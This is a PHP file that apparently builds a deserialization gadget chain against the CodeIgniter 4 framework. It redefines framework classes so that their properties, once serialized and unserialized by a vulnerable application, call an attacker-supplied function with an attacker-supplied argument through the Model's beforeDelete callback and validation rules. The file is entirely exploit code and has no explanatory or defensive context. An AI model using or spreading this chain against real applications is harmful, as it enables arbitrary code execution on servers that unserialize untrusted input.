<?php

namespace CodeIgniter\Cache\Handlers {
    class RedisHandler {
        protected $redis;

        public function __construct($func, $param) {
            $this->redis = new \CodeIgniter\Session\Handlers\MemcachedHandler(
                new \CodeIgniter\Model(
                    new \CodeIgniter\Database\BaseBuilder(
                        new \CodeIgniter\Database\MySQLi\Connection
                    ),
                    new \CodeIgniter\Validation\Validation,
                    $func,
                    new \CodeIgniter\Database\MySQLi\Connection
                ),
                array("x" => $param)
            );
        }
    }
}

namespace CodeIgniter\Session\Handlers {
    class MemcachedHandler {
        protected $memcached;
        protected $lockKey;

        public function __construct($memcached, $param) {
            $this->lockKey = $param;
            $this->memcached = $memcached;
        }
    }
}

namespace CodeIgniter {
    class Model  {
        protected $builder;
        protected $primaryKey;
        protected $beforeDelete;
        protected $validationRules;
        protected $validation;
        protected $tempAllowCallbacks;

        public function __construct($builder, $validation, $func, $db) {
            $this->builder = $builder;
            $this->primaryKey = null;

            $this->beforeDelete = array();
            $this->beforeDelete[] = "validate";

            $this->tempAllowCallbacks = 1;
            $this->db = $db;

            $this->cleanValidationRules = false;
            $this->validation = $validation;
            $this->validationRules = array(
                "id.x" => array(
                    "rules" => array($func, "dd") // function "dd" exits the script.
                )
            );
        }
    }
}

namespace CodeIgniter\Validation {
    class Validation {
        protected $ruleSetFiles;

        public function __construct() {
            $this->ruleSetFiles = array("finfo");
        }
    }
}

namespace CodeIgniter\Database {
    class BaseBuilder { 
        public function __construct($db) {
            $this->QBFrom = array("()");
            $this->db = $db;
        }
    }
}

namespace CodeIgniter\Database\MySQLi {
    class Connection {
    }
}

